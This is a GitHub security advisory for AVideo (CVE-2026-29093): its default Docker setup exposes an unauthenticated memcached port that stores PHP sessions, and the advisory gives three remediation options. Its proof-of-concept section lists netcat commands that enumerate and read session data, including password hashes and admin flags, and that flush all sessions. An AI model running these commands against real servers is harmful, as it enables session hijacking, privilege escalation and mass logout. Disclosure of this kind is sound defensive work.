# [H] AVideo: Unauthenticated PHP session store exposed to host network via published memcached port

## Summary
Severity: High
Advisory: GHSA-xxpw-32hf-q8v9
CVE: CVE-2026-29093
CWE: CWE-287, CWE-668
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-xxpw-32hf-q8v9
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary
The official `docker-compose.yml` publishes the memcached service on host port 11211 (`0.0.0.0:11211`) with no authentication, while the Dockerfile configures PHP to store all user sessions in that memcached instance. An attacker who can reach port 11211 can read, modify, or flush session data — enabling session hijacking, admin impersonation, and mass session destruction without any application-level authentication.

## Severity
**High** (CVSS 3.1: 8.1)

`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`

- **Attack Vector:** Network — `docker-compose.yml` binds memcached to `0.0.0.0:11211` on the host
- **Attack Complexity:** High — exploitation requires port 11211 to be network-reachable, which depends on external firewall/security group configuration beyond the attacker's control
- **Privileges Required:** None — memcached has no authentication mechanism enabled
- **User Interaction:** None
- **Scope:** Unchanged — impact is to the AVideo application's session management
- **Confidentiality Impact:** High — session data includes user IDs, admin flags, email addresses, and password hashes
- **Integrity Impact:** High — an attacker can modify session data to inject admin privileges or impersonate any user
- **Availability Impact:** High — `flush_all` destroys all active sessions, forcing mass logout

## Affected Component
- `docker-compose.yml` — memcached service `ports` directive (line 203)
- `Dockerfile` — PHP session configuration (lines 150-151)

## CWE
- **CWE-668**: Exposure of Resource to Wrong Sphere
- **CWE-287**: Improper Authentication (memcached has no authentication)

## Description

### Memcached port unnecessarily published to host network

The `docker-compose.yml` publishes the memcached port to the Docker host's network interface:

```yaml
# docker-compose.yml — lines 192-213
  memcached:
    image: memcached:alpine
    restart: unless-stopped
    command: >
      memcached -m 512 -c 2048 -t ${NPROC:-4} -R 200
    ports:
      - "${MEMCACHE_PORT:-11211}:11211"    # <-- Exposes to 0.0.0.0:11211
    networks:
      - app_net
```

The memcached command has no authentication flags:
- No `-S` flag (SASL authentication)
- No `-l 127.0.0.1` flag (interface binding restriction)

The default `env.example` reinforces this port:
```
MEMCACHE_PORT=11211
```

### PHP sessions stored entirely in memcached

The Dockerfile configures PHP to use memcached as the session store:

```ini
; Dockerfile — lines 150-151
session.save_handler           = memcached
session.save_path              = "memcached:11211?persistent=1&timeout=2&retry_interval=5"
```

### Session data contains all authentication state

The application stores complete authentication state in sessions. From `objects/user.php`:

```php
// user.php:1521 — login check
$isLogged = !empty($_SESSION['user']['id']);

// user.php:1544 — admin check
return !empty($_SESSION['user']['isAdmin']);
```

Session data includes: user ID, email, username, password hash, admin flag, channel name, photo URL, and email verification status (user.php lines 329-733). All of this is readable and writable via the exposed memcached port.

### Inconsistent defense: database services are correctly internal-only

The `docker-compose.yml` demonstrates awareness of proper service isolation — both database services have NO `ports:` directive:

```yaml
# docker-compose.yml — database service (lines 136-163)
  database:
    build:
      context: .
      dockerfile: Dockerfile.mariadb
    # ... NO ports: directive — internal only
    networks:
      - app_net

# docker-compose.yml — database_encoder service (lines 165-189)
  database_encoder:
    build:
      context: .
      dockerfile: Dockerfile.mariadb
    # ... NO ports: directive — internal only
    networks:
      - app_net
```

Both databases are only reachable via the internal `app_net` Docker network. Memcached — which stores equally sensitive session data — should follow the same pattern but does not. This inconsistency confirms the exposure is an oversight, not a design choice.

### Port exposure map

| Service | Ports published to host | Contains sensitive data | Exposure justified |
|---------|------------------------|------------------------|--------------------|
| avideo | 80, 443, 2053 | N/A (web server) | Yes — serves web traffic |
| live | 1935, 8080, 8443 | N/A (streaming) | Yes — serves RTMP/HLS |
| database | None | Yes (all app data) | Correct — internal only |
| database_encoder | None | Yes (encoder data) | Correct — internal only |
| **memcached** | **11211** | **Yes (all sessions)** | **No — should be internal only** |

### Execution chain

1. Attacker scans the target host and discovers port 11211 is open
2. Attacker connects with `nc TARGET 11211` or any memcached client — no authentication required
3. Attacker runs `stats items` to enumerate session slab classes
4. Attacker runs `stats cachedump <slab_id> <limit>` to list session keys
5. Attacker runs `get <session_key>` to read serialized PHP session data containing user IDs, admin flags, and password hashes
6. Attacker either:
   - **Hijacks a session**: uses the session ID as a cookie to impersonate the user
   - **Escalates privileges**: modifies session data to set `isAdmin` to true via `set <session_key>`
   - **Performs DoS**: runs `flush_all` to destroy all sessions

## Proof of Concept

```bash
# 1. Verify memcached is reachable (returns server stats)
echo -e "stats\r" | nc TARGET 11211

# 2. Enumerate session keys
echo -e "stats items\r" | nc TARGET 11211
# Then for each slab:
echo -e "stats cachedump 1 100\r" | nc TARGET 11211

# 3. Read a session (key format: memc.sess.key.<session_id>)
echo -e "get memc.sess.key.abc123sessionid\r" | nc TARGET 11211
# Returns serialized PHP session with user data, admin flag, etc.

# 4. DoS — destroy all sessions (logs out every user)
echo -e "flush_all\r" | nc TARGET 11211
```

For session hijacking, extract the session ID from step 3 and set it as the `PHPSESSID` cookie in a browser to impersonate the victim user.

## Impact

- **Session hijacking**: Read any user's session data and impersonate them by reusing their session ID — including admin accounts
- **Privilege escalation**: Modify session data to set `$_SESSION['user']['isAdmin']` to a truthy value, granting admin access to any session
- **Credential exposure**: Session data includes password hashes (`$_SESSION['user']['passhash']`, user.php:555) that can be cracked offline
- **Mass session destruction**: `flush_all` destroys all active sessions, forcing every logged-in user to re-authenticate — a one-command denial of service
- **Reconnaissance**: `stats` reveals server uptime, memory usage, connection counts, and cache hit/miss ratios

## Recommended Remediation

### Option 1: Remove the port mapping (preferred — one-line fix)

Memcached is only used internally by the PHP application via Docker networking. Remove the `ports:` directive entirely:

```yaml
# docker-compose.yml — memcached service
  memcached:
    image: memcached:alpine
    restart: unless-stopped
    command: >
      memcached -m 512 -c 2048 -t ${NPROC:-4} -R 200
    # REMOVED: ports:
    #   - "${MEMCACHE_PORT:-11211}:11211"
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: "4G"
        reservations:
          cpus: '0.5'
          memory: '1G'
    networks:
      - app_net
```

Also remove `MEMCACHE_PORT=11211` from `env.example` since the port is no longer published.

The PHP application connects via the Docker internal hostname `memcached:11211` (from `session.save_path`), which uses the `app_net` bridge network and does not require host-level port mapping.

### Option 2: Bind memcached to localhost only (if host access is needed for debugging)

If host-level access to memcached is needed for debugging, bind only to the loopback interface:

```yaml
    ports:
      - "127.0.0.1:${MEMCACHE_PORT:-11211}:11211"
```

This prevents remote access while allowing `localhost:11211` connections from the Docker host.

### Option 3: Enable SASL authentication (defense-in-depth)

Add SASL authentication to memcached as an additional layer:

```yaml
    command: >
      memcached -m 512 -c 2048 -t ${NPROC:-4} -R 200 -S
    environment:
      MEMCACHED_USERNAME: "${MEMCACHED_USER:-avideo}"
      MEMCACHED_PASSWORD: "${MEMCACHED_PASSWORD}"
```

Update the PHP session configuration accordingly:
```ini
session.save_path = "PERSISTENT=myapp avideo:${MEMCACHED_PASSWORD}@memcached:11211"
```

**Note:** Option 1 alone is sufficient and should be applied immediately. Options 2 and 3 provide defense-in-depth.

## Credit
This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-xxpw-32hf-q8v9
- https://nvd.nist.gov/vuln/detail/CVE-2026-29093
- https://github.com/WWBN/AVideo
- https://github.com/WWBN/AVideo/releases/tag/24.0
